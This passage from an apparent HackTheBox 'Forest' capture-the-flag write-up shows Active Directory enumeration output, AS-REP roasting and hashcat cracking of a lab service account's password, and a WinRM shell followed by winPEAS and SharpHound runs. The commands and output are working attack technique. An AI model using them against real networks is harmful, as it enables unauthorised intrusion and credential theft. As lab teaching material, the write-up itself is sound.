group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Account Operators' (RID: 548) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Domain Admins' (RID: 512) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
Group 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Organization Management' (RID: 1104) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group 'Domain Users' (RID: 513) has member: HTB\sebastien
Group 'Domain Users' (RID: 513) has member: HTB\lucinda
Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group 'Domain Users' (RID: 513) has member: HTB\andy
Group 'Domain Users' (RID: 513) has member: HTB\mark
Group 'Domain Users' (RID: 513) has member: HTB\santi
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Schema Admins' (RID: 518) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Domain Computers' (RID: 515) has member: HTB\EXCH01$
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
Group 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Domain Guests' (RID: 514) has member: HTB\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group 'Enterprise Admins' (RID: 519) has member: HTB\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.

 ====================================================================== 
|    Users on 10.129.1.77 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 742.

 ============================================ 
|    Getting printer info for 10.129.1.77    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 995.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Dec 29 13:10:58 2020
```
Find service accounts with preauthentication:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[/usr/share/doc/python3-impacket/examples]
└──╼ [★]$ python3 GetNPUsers.py -dc-ip 10.129.1.77 -no-pass -usersfile /home/htb-jib1337/writeups/HackTheBox/HTB_Forest/users.txt 'htb.local/' -format hashcat
GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if domain is '':
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:9289f66894ff6a6ec11ce085d88d2b44$
```

### 3. Crack the message
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~/writeups/HackTheBox/HTB_Forest]
└──╼ [★]$ hashcat -a 0 -m 18200 svc-alfresco.aesrep /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz, 2048/5918 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 3120

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-pure.e12ed434.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 44754478080
* Runtime...: 2 secs

$krb5asrep$23$svc-alfresco@HTB.LOCAL:9289f66894ff6a6ec11ce085d88d2b44$:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:9289f66894ff6a...dd75a2
Time.Started.....: Tue Dec 29 13:17:44 2020 (22 secs)
Time.Estimated...: Tue Dec 29 13:18:06 2020 (0 secs)
Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1252.6 kH/s (6.35ms) @ Accel:8 Loops:4 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 27320320/44754478080 (0.06%)
Rejected.........: 0/27320320 (0.00%)
Restore.Point....: 8192/14344384 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:856-860 Iteration:0-4
Candidates.#1....: t1odles -> 14221122

Started: Tue Dec 29 13:17:31 2020
Stopped: Tue Dec 29 13:18:07 2020
```
This retrieves the service account credentials as `svc-alfresco:s3rvice`.

### 4. Get a shell
Throw the creds into CME:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~/enum4linux]
└──╼ [★]$ crackmapexec winrm 10.129.1.77 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.129.1.77     5985   NONE             [*] http://10.129.1.77:5985/wsman
WINRM       10.129.1.77     5985   NONE             [+] None\svc-alfresco:s3rvice (Pwn3d!)
```
Log in with WinRM.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~/enum4linux]
└──╼ [★]$ evil-winrm -i 10.129.1.77 -u 'svc-alfresco' -p s3rvice

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

### 5. Enumeration from user
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Get-ComputerInfo

WindowsBuildLabEx                                       : 14393.2273.amd64fre.rs1_release_1.180427-1811
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server Core
WindowsInstallDateFromRegistry                          : 9/18/2019 5:07:59 PM
WindowsProductId                                        : 00376-30821-30176-AA930
WindowsProductName                                      : Windows Server 2016 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
```
The machine is 64 bit, Windows Server 2016.
Checking out groups:
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
Upload and run winPEAS:
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload ../winPEAS.exe
Info: Uploading ../winPEAS.exe to C:\Users\svc-alfresco\Desktop\winPEAS.exe

                                                             
Data: 322900 bytes of 322900 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\winPEAS.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Program.CreateDynamicLists()
   - Creating current user groups list...
   - Creating active users list...
  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at winPEAS.UserInfo.GetMachineUsers(Boolean onlyActive, Boolean onlyDisabled, Boolean onlyLockout, Boolean onlyAdmins, Boolean fullInfo)
   - Creating disabled users list...
  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at winPEAS.UserInfo.GetMachineUsers(Boolean onlyActive, Boolean onlyDisabled, Boolean onlyLockout, Boolean onlyAdmins, Boolean fullInfo)
   - Admin users list...
  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at winPEAS.UserInfo.GetMachineUsers(Boolean onlyActive, Boolean onlyDisabled, Boolean onlyLockout, Boolean onlyAdmins, Boolean fullInfo)

             *((,.,/((((((((((((((((((((/,  */
      ,/*,..*((((((((((((((((((((((((((((((((((,
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
    ((((((((((((((((**********/########## .(* ,(((((((
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop

  [+] Leyend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


  ==========================================(System Information)==========================================

  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
   at System.ThrowHelper.ThrowKeyNotFoundException()
   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
   at winPEAS.Program.<PrintSystemInfo>g__PrintBasicSystemInfo|40_0()

  [+] PowerShell Settings()
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.14393.0
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 

  [+] Audit Settings(T1012)
   [?] Check what is being logged 
    Not Found

  [+] WEF Settings(T1012)
   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

  [+] LAPS Settings(T1012)
   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

  [+] Wdigest()
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection()
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

  [+] Credentials Guard()
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

  [+] Cached Creds()
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

  [+] User Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    COMPUTERNAME: FOREST
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\svc-alfresco\AppData\Local
    PSModulePath: C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 23
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\svc-alfresco
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0102
    USERNAME: svc-alfresco
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\SVC-AL~1\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\svc-alfresco\AppData\Roaming
    TMP: C:\Users\SVC-AL~1\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: HTB
    USERDNSDOMAIN: htb.local

  [+] System Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 23
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
    PROCESSOR_REVISION: 0102

  [+] HKCU Internet Settings(T1012)
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

  [+] HKLM Internet Settings(T1012)
    EnablePunycode: 1

  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

  [+] AV Information(T1063)
  [X] Exception: Access denied 
    No AV was detected!!
    Not Found

  [+] UAC Status(T1012)
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.
```
The machine does not appear to be running any AV.  
Collect data for BloodHound:
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe
------------------------------------------------
Initializing SharpHound at 6:10 AM on 12/29/2020
------------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
